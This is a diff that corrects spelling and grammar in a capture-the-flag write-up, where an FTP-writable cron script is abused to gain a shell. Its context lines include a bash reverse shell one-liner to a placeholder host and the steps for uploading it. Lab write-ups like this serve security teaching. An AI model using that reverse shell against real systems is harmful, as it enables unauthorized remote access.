@@ -205,7 +205,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
            Raw packets sent: 62 (4.284KB) | Rcvd: 45 (3.248KB)
 
 ````````
-So we have 4 ports open 21(FTP) ,22(ssh) ,139 and 445(smb). First lets check what in ftp... 
+So we have 4 ports open 21(FTP) ,22(ssh) ,139 and 445(smb). First, let's check what is in FTP...
 
 ### FTP 
 
@@ -259,7 +259,7 @@ ftp>
 
 
 ````````
-okey, here we have 3 files lets download all of them and see what are they... the clean.sh is bash script which is running in background on our targeted machin. lets add our one liner bash reverse shell and upload it and hope to get an reverse shell back. 
+Okay, here we have 3 files let's download all of them and see what they are... the clean.sh is a bash script running in the background on our targeted machine. let's add our one-liner bash reverse shell and upload it and hope to get a reverse shell back.  
 
 ````````c
 bash -i >& /dev/tcp/YOUR_IP/8080 0>&1
@@ -275,7 +275,7 @@ local: clean.sh remote: clean.sh
 56 bytes sent in 00:00 (0.14 KiB/s)
 
 ````````
-So, we have an shell. lets get our first flag. 
+So, we have a shell. let's get our first flag. 
 
 ## Getting our first flag
 
@@ -295,7 +295,7 @@ remote) namelessone@anonymous:/home/namelessone$ cat user.txt
 {REDACTED}
 
 ````````
-YESS!!! we got user.txt. now lets esculate our privilaga and get root.txt.... 
+YESS!!! we got user.txt. now let's escalate our privilege and get root.txt... 
 
 ## Privilage Esculation
 
